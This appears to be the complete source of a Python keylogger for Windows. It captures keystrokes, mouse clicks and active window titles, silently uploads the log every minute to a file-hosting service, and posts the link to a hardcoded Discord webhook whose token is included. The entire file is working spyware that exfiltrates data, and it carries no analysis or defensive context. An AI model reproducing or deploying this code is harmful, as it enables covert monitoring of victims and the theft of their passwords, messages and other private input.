import pynput, threading, win32api, time, anonfile, os, win32gui, unidecode, json, urllib.request

loggedKeys = "" 
storedKey = ""
activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
webhook = "https://discord.com/api/webhooks/1000719678412423178/i3gXhTbs85iGIJn7-dUptN5GfJHIxik6mwuwRkCeSMEDXCAclBU1e201E_dFJ3IA1db7"

def mouseget():
    global loggedKeys 
    state_left = win32api.GetKeyState(0x01)
    while True:
        if win32api.GetKeyState(0x01) != state_left:
            state_left = win32api.GetKeyState(0x01)
            if win32api.GetKeyState(0x01) < 0: loggedKeys = loggedKeys + f" [Mouse.Left_Click] ".replace("'", "")
        time.sleep(0.1)

def send():
    global loggedKeys, activeWindow
    while True:
        time.sleep(60)
        timenow = time.strftime("%d-%m-%Y_%H-%M-%S")
        try:
            with open(f"log_{timenow}.txt", "w") as f:
                f.write(loggedKeys)

            try:
                headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                payload = json.dumps({'content': "@everyone " + anonfile.AnonFile().upload(f"log_{timenow}.txt", progressbar=False).url.geturl()})
            except: pass

            try:
                req = urllib.request.Request(webhook, data=payload.encode(), headers=headers)
                urllib.request.urlopen(req)
                loggedKeys = ""
            except: pass
            
            os.remove(f"log_{timenow}.txt")
        except: pass
        activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())

def windowget():
    global loggedKeys, activeWindow
    while True:
        if win32gui.GetWindowText(win32gui.GetForegroundWindow()) != activeWindow:
            loggedKeys = loggedKeys + unidecode.unidecode(f" [{win32gui.GetWindowText(win32gui.GetForegroundWindow())}] ".replace("'", ""))
            activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())

def keyboardget(key):
    global loggedKeys, storedKey
    try:
        loggedKeys = loggedKeys + f"{str(storedKey)}".replace("'", "")
        if key.vk >= 96 and key.vk <= 105: storedKey = int(key.vk) - 96
        else: storedKey = key.char
    except AttributeError: loggedKeys = loggedKeys + f" [{str(key)}] ".replace("'", "")

threading.Thread(target=mouseget, daemon=True).start()
threading.Thread(target=send, daemon=True).start()
threading.Thread(target=windowget, daemon=True).start()
with pynput.keyboard.Listener(on_press=keyboardget) as listener: listener.join()